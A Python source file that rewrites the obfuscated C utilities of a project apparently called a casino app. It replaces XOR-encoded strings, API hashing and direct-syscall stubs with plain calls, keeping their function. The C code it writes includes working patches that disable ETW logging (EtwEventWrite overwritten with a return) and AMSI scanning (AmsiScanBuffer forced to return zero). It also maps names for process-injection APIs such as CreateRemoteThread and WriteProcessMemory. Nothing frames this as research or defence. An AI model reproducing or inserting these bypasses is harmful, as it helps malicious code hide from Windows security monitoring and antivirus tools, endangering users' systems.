#!/usr/bin/env python3
"""Strip obfuscation patterns from obf*.c files - replace with plain implementations."""

import re

def read_file(path):
    with open(path, 'r') as f:
        return f.read()

def write_file(path, content):
    with open(path, 'w') as f:
        f.write(content)

def strip_obf_c(content):
    """Transform obf.c to use plain strings and APIs."""
    
    # Build mapping from encoded array names to plain strings
    # Pattern: /* "string" */\nstatic unsigned char enc_xxx[] = {...};
    mapping = {}
    pattern = r'/\*\s*"([^"]+)"\s*\*/\s*\nstatic unsigned char (enc_\w+)\[\]\s*=\s*\{[^}]+\};'
    for match in re.finditer(pattern, content):
        plain_str = match.group(1)
        array_name = match.group(2)
        mapping[array_name] = plain_str
    
    # Also handle single-line arrays
    pattern2 = r'/\*\s*"([^"]+)"\s*\*/\s*static unsigned char (enc_\w+)\[\]\s*=\s*\{[^}]+\};'
    for match in re.finditer(pattern2, content):
        plain_str = match.group(1)
        array_name = match.group(2)
        mapping[array_name] = plain_str
    
    # Add API name mappings (from variable names)
    api_mappings = {
        'enc_valloc': 'VirtualAllocEx',
        'enc_writemem': 'WriteProcessMemory',
        'enc_createthread': 'CreateRemoteThread',
        'enc_openproc': 'OpenProcess',
        'enc_winexec': 'WinExec',
        'enc_loadlib': 'LoadLibraryA',
        'enc_getproc': 'GetProcAddress',
        'enc_getmod': 'GetModuleHandleA',
        'enc_enumproc': 'EnumProcessModules',
        'enc_getbasename': 'GetModuleBaseNameA',
    }
    for k, v in api_mappings.items():
        if k not in mapping:
            mapping[k] = v
    
    # Replace get_str(enc_xxx, sizeof(enc_xxx)) with "plain_string"
    content = re.sub(
        r'get_str\((enc_\w+),\s*sizeof\(\1\)\)',
        lambda m: f'"{mapping.get(m.group(1), m.group(1))}"',
        content
    )
    
    # Replace runtime_hash_enc(enc_xxx, sizeof(enc_xxx)) with 0 (hashes not needed)
    # We'll replace resolve_api calls with GetProcAddress directly
    content = re.sub(
        r'resolve_api\((\w+),\s*runtime_hash_enc\((enc_\w+),\s*sizeof\(\2\)\)\)',
        lambda m: f'GetProcAddress({m.group(1)}, "{mapping.get(m.group(2), m.group(2))}")',
        content
    )
    
    # Also replace direct resolve_api with known hash values
    # HASH_VirtualAllocEx = 0x3d28cf79, etc.
    hash_to_name = {
        'HASH_VirtualAllocEx': 'VirtualAllocEx',
        'HASH_WriteProcessMemory': 'WriteProcessMemory',
        'HASH_CreateRemoteThread': 'CreateRemoteThread',
        'HASH_OpenProcess': 'OpenProcess',
        'HASH_WinExec': 'WinExec',
        'HASH_LoadLibraryA': 'LoadLibraryA',
        'HASH_GetProcAddress': 'GetProcAddress',
        'HASH_GetModuleHandleA': 'GetModuleHandleA',
        'HASH_EnumProcessModules': 'EnumProcessModules',
        'HASH_GetModuleBaseNameA': 'GetModuleBaseNameA',
    }
    for hash_name, api_name in hash_to_name.items():
        content = re.sub(
            rf'resolve_api\((\w+),\s*{hash_name}\)',
            f'GetProcAddress(\\1, "{api_name}")',
            content
        )
    
    # Remove XOR key define
    content = re.sub(r'#define XOR_KEY 0x[0-9A-Fa-f]+\n', '', content)
    
    # Remove xor_decode function
    content = re.sub(
        r'/\* XOR decode.*?\n\}\n',
        '',
        content,
        flags=re.DOTALL
    )
    
    # Remove djb2_hash and runtime_hash_enc functions
    content = re.sub(
        r'/\* Simple djb2 hash.*?return hash;\n\}\n',
        '',
        content,
        flags=re.DOTALL
    )
    content = re.sub(
        r'/\* Runtime hash from encoded string.*?return hash;\n\}\n',
        '',
        content,
        flags=re.DOTALL
    )
    
    # Remove all static unsigned char enc_xxx[] declarations
    content = re.sub(
        r'/\*\s*"[^"]*"\s*\*/\s*\nstatic unsigned char enc_\w+\[\]\s*=\s*\{[^}]+\};\n',
        '',
        content
    )
    content = re.sub(
        r'/\*\s*"[^"]*"\s*\*/\s*static unsigned char enc_\w+\[\]\s*=\s*\{[^}]+\};\n',
        '',
        content
    )
    
    # Remove hash value defines
    content = re.sub(r'#define HASH_\w+\s+0x[0-9a-fA-F]+\n', '', content)
    
    # Clean up multiple blank lines
    content = re.sub(r'\n{3,}', '\n\n', content)
    
    return content

def strip_syscalls(content):
    """Transform obf_syscalls.c to use plain APIs instead of direct syscalls."""
    
    # Replace create_syscall_stub with plain VirtualAlloc
    content = re.sub(
        r'static void\* create_syscall_stub\(DWORD syscall_num\) \{.*?\n    return mem;\n\}',
        '''static void* create_syscall_stub(DWORD syscall_num) {
    /* Plain implementation - no raw syscall stubs */
    (void)syscall_num;
    return NULL;
}''',
        content,
        flags=re.DOTALL
    )
    
    # Replace init_syscalls to use plain APIs
    content = re.sub(
        r'static void init_syscalls\(void\) \{.*?\n\}',
        '''static void init_syscalls(void) {
    /* Plain implementation - use standard APIs */
}''',
        content,
        flags=re.DOTALL
    )
    
    # Replace sc_protect_memory with VirtualProtect
    content = re.sub(
        r'static NTSTATUS sc_protect_memory\(.*?\n    return.*?\n\}',
        '''static NTSTATUS sc_protect_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    DWORD old;
    BOOL ok = VirtualProtect(*BaseAddress, *NumberOfBytesToProtect, NewAccessProtection, &old);
    *OldAccessProtection = old;
    return ok ? 0 : -1;
}''',
        content,
        flags=re.DOTALL
    )
    
    # Replace obf_bypass_etw_syscall with plain VirtualProtect
    content = re.sub(
        r'void obf_bypass_etw_syscall\(void\) \{.*?\n\}',
        '''void obf_bypass_etw_syscall(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_READWRITE, &oldProtect)) return;
    *(unsigned char*)pEtwEventWrite = 0xC3;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READ, &oldProtect);
}''',
        content,
        flags=re.DOTALL
    )
    
    # Replace obf_bypass_amsi_syscall with plain VirtualProtect
    content = re.sub(
        r'void obf_bypass_amsi_syscall\(void\) \{.*?\n\}',
        '''void obf_bypass_amsi_syscall(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_READWRITE, &oldProtect)) return;
    unsigned char patch[] = {0x31, 0xC0, 0xC3};
    memcpy(pAmsiScanBuffer, patch, 3);
    VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READ, &oldProtect);
}''',
        content,
        flags=re.DOTALL
    )
    
    return content

def strip_etw(content):
    """Transform obf_etw_amsi_reflect.c to use plain strings."""
    
    # Build mapping from encoded arrays to plain strings
    mapping = {}
    pattern = r'/\*\s*"([^"]+)"\s*\*/\s*\nstatic unsigned char (enc_\w+)\[\]\s*=\s*\{[^}]+\};'
    for match in re.finditer(pattern, content):
        mapping[match.group(2)] = match.group(1)
    
    # Replace get_str calls
    content = re.sub(
        r'get_str\((enc_\w+),\s*sizeof\(\1\)\)',
        lambda m: f'"{mapping.get(m.group(1), m.group(1))}"',
        content
    )
    
    # Replace obf_xxx() string accessor calls with plain strings
    accessor_map = {
        'obf_ntdll()': '"ntdll.dll"',
        'obf_etweventwrite()': '"EtwEventWrite"',
        'obf_amsiscanbuffer()': '"AmsiScanBuffer"',
        'obf_amsiinit()': '"AmsiInitialize"',
        'obf_amsidll()': '"amsi.dll"',
        'obf_ntsetinfothread()': '"NtSetInformationThread"',
    }
    for old, new in accessor_map.items():
        content = content.replace(old, new)
    
    # Remove encoded array declarations
    content = re.sub(
        r'/\*\s*"[^"]*"\s*\*/\s*\nstatic unsigned char enc_\w+\[\]\s*=\s*\{[^}]+\};\n',
        '',
        content
    )
    
    # Replace VirtualProtect RWX with RW→RX in obf_bypass_etw and obf_bypass_amsi
    content = content.replace(
        'VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)',
        'VirtualProtect(pEtwEventWrite, 1, PAGE_READWRITE, &oldProtect)'
    )
    content = content.replace(
        'VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);',
        'VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READ, &oldProtect);'
    )
    content = content.replace(
        'VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)',
        'VirtualProtect(pAmsiScanBuffer, 3, PAGE_READWRITE, &oldProtect)'
    )
    content = content.replace(
        'VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);',
        'VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READ, &oldProtect);'
    )
    
    return content

def main():
    import sys
    
    # Transform obf.c
    obf_c = read_file('/Users/Jakin/new-vivid-casino-1/src/utils/obf.c')
    obf_c = strip_obf_c(obf_c)
    write_file('/Users/Jakin/new-vivid-casino-1/src/utils/obf.c', obf_c)
    print("Transformed obf.c")
    
    # Transform obf_syscalls.c
    syscalls_c = read_file('/Users/Jakin/new-vivid-casino-1/src/utils/obf_syscalls.c')
    syscalls_c = strip_syscalls(syscalls_c)
    write_file('/Users/Jakin/new-vivid-casino-1/src/utils/obf_syscalls.c', syscalls_c)
    print("Transformed obf_syscalls.c")
    
    # Transform obf_etw_amsi_reflect.c
    etw_c = read_file('/Users/Jakin/new-vivid-casino-1/src/utils/obf_etw_amsi_reflect.c')
    etw_c = strip_etw(etw_c)
    write_file('/Users/Jakin/new-vivid-casino-1/src/utils/obf_etw_amsi_reflect.c', etw_c)
    print("Transformed obf_etw_amsi_reflect.c")

if __name__ == '__main__':
    main()
